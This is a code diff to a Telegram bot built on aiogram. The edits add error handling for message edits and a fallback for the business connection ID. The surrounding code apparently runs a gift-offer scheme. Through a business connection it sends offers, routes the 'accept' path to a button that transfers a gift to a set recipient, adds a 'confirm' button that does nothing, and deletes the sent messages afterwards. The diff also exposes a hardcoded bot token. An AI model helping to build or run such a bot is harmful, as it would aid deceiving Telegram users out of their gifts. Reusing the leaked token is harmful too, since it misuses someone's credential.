@@ -5,7 +5,7 @@ from aiogram import Bot, Dispatcher, F
 from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, LinkPreviewOptions
 from aiogram.enums import ParseMode
 from aiogram.fsm.storage.memory import MemoryStorage
-from aiogram.exceptions import TelegramRetryAfter
+from aiogram.exceptions import TelegramRetryAfter, TelegramBadRequest
 
 TOKEN = "9252419350:AAFEQ930iWfDMcC1bNRmOE2zmSbYK9kpj_g"
 
@@ -77,9 +77,9 @@ def make_offer_keyboard(gift_name, gift_num, amount, currency_type, lang):
     cb_data  = f"a|{slug}|{gift_num}|{amount}|{currency_type}|{lang}"
     return InlineKeyboardMarkup(inline_keyboard=[[
         InlineKeyboardButton(text=loc["btn_decline"], callback_data=f"d|{gift_num}",
-                             icon_custom_emoji_id="5778527486270770928"),
+                           icon_custom_emoji_id="5778527486270770928"),
         InlineKeyboardButton(text=loc["btn_accept"],  callback_data=cb_data,
-                             icon_custom_emoji_id="5776375003280838798"),
+                           icon_custom_emoji_id="5776375003280838798"),
     ]])
 
 
@@ -87,8 +87,8 @@ def make_accept_keyboard(lang, recipient):
     loc = LOCALES.get(lang, LOCALES["ru"])
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text=loc["btn_transfer"],
-                              url=f"tg://send_gift?to={recipient}",
-                              icon_custom_emoji_id="5875180111744995604")],
+                             url=f"tg://send_gift?to={recipient}",
+                             icon_custom_emoji_id="5875180111744995604")],
         [InlineKeyboardButton(text=loc["btn_confirm"], callback_data="noop")],
     ])
 
@@ -192,7 +192,9 @@ async def accept_offer(cb: CallbackQuery):
     cb_chat_id = cb.message.chat.id
     message_id = cb.message.message_id
     stored    = _bcid_store.get(f"{cb_chat_id}:{message_id}")
-    bcid      = stored["bcid"]      if stored else None
+    
+    # Исправлено: если в памяти нет сохраненного bcid, берем его из самого объекта callback_query
+    bcid      = stored["bcid"]      if stored else cb.message.business_connection_id
     chat_id   = stored["chat_id"]   if stored else cb_chat_id
     recipient = stored["recipient"] if stored else "recipient_username"
     lang      = stored.get("lang", lang) if stored else lang
@@ -208,6 +210,11 @@ async def accept_offer(cb: CallbackQuery):
             reply_markup=make_accept_keyboard(lang, recipient),
             business_connection_id=bcid,
         )
+    except TelegramBadRequest as e:
+        if "message is not modified" in str(e).lower():
+            pass
+        else:
+            logging.error(f"accept edit error: {e}")
     except Exception as e:
         logging.error(f"accept edit error: {e}")
 
@@ -254,10 +261,10 @@ async def sender_worker():
 
             if task["bcid"] and sent_msg:
                 _bcid_store[f"{task['chat_id']}:{sent_msg.message_id}"] = {
-                    "bcid":      task["bcid"],
-                    "chat_id":   task["chat_id"],
+                    "bcid":     task["bcid"],
+                    "chat_id":  task["chat_id"],
                     "recipient": task["recipient"],
-                    "lang":      task["lang"],
+                    "lang":     task["lang"],
                 }
                 await bot.delete_business_messages(
                     business_connection_id=task["bcid"],
